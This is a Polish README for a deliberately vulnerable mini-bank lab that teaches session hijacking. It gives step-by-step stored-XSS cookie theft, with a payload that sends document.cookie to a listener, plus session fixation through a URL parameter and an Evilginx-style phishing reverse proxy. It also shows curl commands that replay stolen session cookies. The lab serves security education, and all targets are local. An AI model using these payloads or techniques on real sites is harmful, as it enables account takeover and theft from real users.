<p align="center">
  <img src="assets/banner.png" alt="Session Hijacking" width="520">
</p>

# Session Hijacking Lab — NovaBank

Celowo podatna aplikacja webowa (mini-bank) do nauki, jak działa **przejęcie sesji**
(*session hijacking*). Projekt edukacyjny — aplikacja jest celowo podatna, bez żadnego trybu bezpiecznego.

> ⚠️ Materiał **wyłącznie edukacyjny**. Uruchamiaj tylko lokalnie, na własnej maszynie.

---

<h2 align="center"><img src="assets/szybki-start.png" alt="Szybki start" width="340"></h2>

Potrzebujesz tylko **Pythona 3** — żadnych bibliotek, żadnego `pip install`.

```powershell
git clone https://github.com/mipacyna/session-hijacking-lab-baim.git
cd session-hijacking-lab-baim
python app.py
```

Otwórz w przeglądarce **http://localhost:5476** i zaloguj się:

| Konto | Login / hasło |
|---|---|
| Ofiara | `alice` / `password123` |
| Atakujący | `mallory` / `mallory123` |

Nie masz gita? Na GitHubie **Code → Download ZIP**, rozpakuj i w folderze uruchom `python app.py`.
Masz Dockera? Zamiast tego: `docker compose up --build`.

---

<h2 align="center"><img src="assets/co-pokazuje.png" alt="Co pokazuje lab" width="340"></h2>

Mini-bank, na którym można na żywo prześledzić przejęcie cudzej sesji:

- **XSS** — wstrzyknięty skrypt wykrada ciasteczko sesyjne.
- **Session Fixation** — atakujący narzuca ofierze znany identyfikator sesji.
- **Phishing AiTM** — reverse proxy (`aitm.py`) przechwytuje sesję w locie (jak Evilginx).

Myśl przewodnia: *sesja to „bilet na okaziciela" — kto ma ciasteczko `SESSIONID`, ten jest
zalogowanym użytkownikiem, bez hasła i bez 2FA.*

---

<h2 align="center"><img src="assets/payload-xss.png" alt="Payload XSS" width="340"></h2>

**(do wypróbowania)**

Podatność to **stored XSS w tytule przelewu** — serwer renderuje tytuł bez escapowania.
Zaloguj się jako `mallory`, wyślij Alicji przelew na `0,01`, a w polu **Tytuł przelewu** wklej:

```html
<script>new Image().src="http://localhost:9000/?c="+encodeURIComponent(document.cookie)</script>
```

Na osobnym terminalu odpal nasłuch atakującego:

```powershell
python -m http.server 9000
```

Gdy Alicja otworzy historię transakcji, jej przeglądarka wykona skrypt i wyśle `SESSIONID`
na ten serwer. Skradzione cookie wklejasz u siebie — **DevTools → Application → Cookies**
albo:

```powershell
curl http://localhost:5476/dashboard -H "Cookie: SESSIONID=<skradziony_id>"
```

…i jesteś zalogowany jako Alicja, bez hasła.

> Dlaczego działa: tytuł przelewu trafia do HTML surowo, a cookie nie ma flagi `HttpOnly`,
> więc `document.cookie` (JavaScript) może je odczytać i wysłać na zewnątrz.

---

<h2 align="center"><img src="assets/session-fixation.png" alt="Session Fixation" width="420"></h2>

**Atak krok po kroku**

Pomysł: atakujący **sam wybiera** identyfikator sesji i podsuwa go ofierze **zanim**
się zaloguje. Aplikacja po logowaniu **nie zmienia** `SESSIONID`, więc po zalogowaniu
ofiary ten sam identyfikator jest już ważną sesją — a atakujący go zna.

1. Atakujący zmyśla sobie dowolny identyfikator, np. `atak123`, i wysyła ofierze link:

   ```
   http://localhost:5476/?sid=atak123
   ```

2. Ofiara klika link. Aplikacja ustawia jej w przeglądarce ciasteczko
   `SESSIONID=atak123` i przerzuca na stronę logowania.

3. Ofiara **normalnie się loguje** (`alice` / `password123`). Serwer **nie generuje**
   nowego identyfikatora — zostaje `atak123`, teraz powiązany z kontem Alicji.

4. Atakujący, który od początku zna `atak123`, wkleja go u siebie i jest zalogowany
   jako Alicja:

   ```powershell
   curl http://localhost:5476/dashboard -H "Cookie: SESSIONID=atak123"
   ```

   (albo **DevTools → Application → Cookies** → wpisz `SESSIONID` = `atak123` i odśwież).

> Dlaczego działa: aplikacja przyjmuje identyfikator sesji z adresu URL i **nie wydaje
> nowego po zalogowaniu**. Poprawnie zrobiony bank regeneruje `SESSIONID` przy logowaniu.

---

<h2 align="center"><img src="assets/phishing-aitm.png" alt="Phishing AiTM" width="380"></h2>

**Reverse proxy, jak Evilginx**

Pomysł: ofiara loguje się na **podstawionej stronie** atakującego, która po cichu
przepuszcza cały ruch do prawdziwego banku (*Adversary-in-the-Middle*). Hasło i nawet
2FA przechodzą do prawdziwego serwera — a po drodze proxy **przechwytuje gotowe
ciasteczko sesji**.

1. Uruchom prawdziwy bank (jeśli jeszcze nie działa):

   ```powershell
   python app.py
   ```

2. W **drugim** terminalu uruchom proxy phishingowe atakującego:

   ```powershell
   python aitm.py
   ```

   Proxy nasłuchuje na **http://localhost:7000** i przekazuje wszystko do banku na 5476.

3. Ofiara dostaje link do „banku" i loguje się — ale pod adresem atakującego:

   ```
   http://localhost:7000
   ```

   Strona wygląda 1:1 jak NovaBank (bo to ten sam bank, tylko przez proxy). Ofiara
   wpisuje `alice` / `password123` i loguje się normalnie.

4. W terminalu z `aitm.py` pojawia się przechwycona sesja:

   ```
   >>> PRZECHWYCONO SESJE OFIARY: SESSIONID=...
   ```

5. Atakujący wkleja to ciasteczko u siebie i wchodzi na konto Alicji na **prawdziwym**
   banku (5476), bez hasła:

   ```powershell
   curl http://localhost:5476/dashboard -H "Cookie: SESSIONID=<przechwycony_id>"
   ```

> Dlaczego działa: liczy się **ciasteczko sesji po zalogowaniu**, a nie samo hasło.
> Skoro atakujący stoi w środku połączenia, przejmuje gotową sesję — dlatego klasyczne
> 2FA tu nie chroni (chronią dopiero passkeys / FIDO2 i tokeny powiązane z urządzeniem).

---

<h2 align="center"><img src="assets/tryby.png" alt="Tryby uruchomienia" width="420"></h2>

| Polecenie | Co uruchamia |
|---|---|
| `python app.py` | podatny bank (XSS + Session Fixation) na porcie 5476 |
| `python aitm.py` | proxy AiTM (phishing) na porcie 7000 |

Reset stanu labu (salda, sesje): **http://localhost:5476/reset**

---

<h2 align="center"><img src="assets/pliki.png" alt="Pliki" width="240"></h2>

- `app.py` — podatny bank (czysty Python, bez zależności).
- `aitm.py` — reverse proxy AiTM (symulacja Evilginx).
- `Dockerfile`, `docker-compose.yml` — uruchomienie w kontenerze.
- `start.ps1` — skrót do uruchomienia bez Dockera.
